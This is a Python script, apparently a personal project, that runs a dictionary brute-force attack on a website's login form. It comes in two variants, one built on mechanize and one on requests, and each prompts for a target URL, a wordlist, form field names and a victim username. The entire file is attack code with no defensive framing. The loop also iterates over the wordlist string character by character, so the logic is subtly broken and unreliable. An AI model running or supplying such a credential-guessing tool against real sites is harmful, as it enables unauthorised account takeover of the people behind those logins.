# -*- coding: utf-8 -*-
"""
Created on Wed May 20 11:42:49 2020

@author: MBI -> Ataque de fuerza bruta
"""
import mechanize as me
import re

def Main():
    browser=me.Browser()
    url=input('[*] Url para abrir [*]-> ')
    diccionario=input('[*] Ruta de Archivo diccionario [*]-> ')
    username=input('[*] Nombre del loggin en pagina  [*]-> ')
    password=input('[*] Nombre del password en pagina [*]-> ')
    nombre=input('[*] Nombre del usuario [*]-> ')
    
    url_index=re.findall('(http.+)\/',url)
    for url_i in url_index:
       url_index=url_i+'index.php'
        
    try:
        with open(diccionario,'r') as fname:
            worlist=fname.read()
            fname.close()
    except :
        print('[*] No se encontro el archivo [*]')
        quit()
    
    for palabra in worlist:
        response=browser.open(url)
        browser.select_form(nr=0)
        browser.form[username]=nombre
        browser.form[password]=palabra.strip()
        browser.method='POST'
        response=browser.submit()
        if response.geturl()==url_index:
            print('[*] Password encontrado {}'.format(palabra.strip()))
            break
        else:
            pass
        


    
if __name__=='__main__':
    Main()
#%%
import requests as req
diccionario=input('[*] Ruta de Archivo diccionario [*]-> ')
url=input('[*] Url para abrir [*]-> ')
username=input('[*] Nombre en la forma [*]-> ')
loggin=input('[*] Loggin en la forma [*]-> ')
name=input('[*] Nombre del objetivo [*]-> ')
try:
   with open(diccionario,'r') as fname:
    worlist=fname.read()
    fname.close()
except :
        print('[*] No se encontro el archivo [*]')
        quit()

for palabra in worlist:
    datos={
        username: name,
        loggin:palabra.strip()
        }
    response=req.post(url,data=datos,allow_redirects=False)
    if response.status_code in [301,302]:
        print('[*] Password encontrado Nombre: {} Password: {} '.format(name,palabra.strip()))
        break
    else:
        pass
#%%







